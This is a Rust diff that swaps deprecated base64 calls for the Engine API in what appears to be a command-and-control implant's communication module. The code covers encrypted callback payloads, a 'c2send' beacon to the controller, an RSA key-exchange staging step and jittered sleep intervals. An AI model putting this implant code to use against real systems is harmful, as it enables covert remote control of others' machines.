@@ -1,4 +1,5 @@
 use crate::payloadvars;
+use base64::{Engine as _, engine::general_purpose};
 use rand::Rng;
 use std::error::Error;
 
@@ -95,19 +96,19 @@ impl Profile {
 
         // Formulate the post request payload and encrypt it if necessary
         let req_payload: String = match profile.get_aes_key() {
-            Some(key) => base64::encode(encrypt_payload(
+            Some(key) => general_purpose::STANDARD.encode(encrypt_payload(
                 data.as_bytes(),
                 key,
                 Some(&self.callback_uuid),
             )),
-            None => base64::encode(format!("{}{}", self.callback_uuid, data)),
+            None => general_purpose::STANDARD.encode(format!("{}{}", self.callback_uuid, data)),
         };
 
         // Send the payload through the configured C2 profile
         let body = profile.c2send(&req_payload).unwrap();
 
         // Decode the response
-        let decoded = base64::decode(body)?;
+        let decoded = general_purpose::STANDARD.decode(body)?;
 
         // Decrypt the payload if needed
         let decrypted_body: Vec<u8> = match profile.get_aes_key() {
@@ -127,7 +128,7 @@ impl Profile {
             self.perform_key_exchange()?;
             let sleep_interval = payloadvars::callback_interval() / 4;
             let sleep_interval =
-                crate::agent::calculate_sleep_time(sleep_interval, payloadvars::callback_jitter());
+                crate::calculate_sleep_time(sleep_interval, payloadvars::callback_jitter());
             std::thread::sleep(std::time::Duration::from_secs(sleep_interval));
         }
 
@@ -162,7 +163,7 @@ impl Profile {
         // Formulate the body for staging a key exchange
         let body = json!({
             "action": "staging_rsa",
-            "pub_key": base64::encode(public_key),
+            "pub_key": general_purpose::STANDARD.encode(public_key),
             "session_id": session_id.iter().cloned().collect::<String>(),
         })
         .to_string();
@@ -183,7 +184,7 @@ impl Profile {
 
         // Grab the new AES key from the RSA encrypted response
         let mut new_key = vec![0; rsa_key.size() as usize];
-        let encrypted_aes_key = base64::decode(&body.session_key)?;
+        let encrypted_aes_key = general_purpose::STANDARD.decode(&body.session_key)?;
 
         rsa_key.private_decrypt(&encrypted_aes_key, &mut new_key, rsa::Padding::PKCS1_OAEP)?;
         new_key.truncate(32);
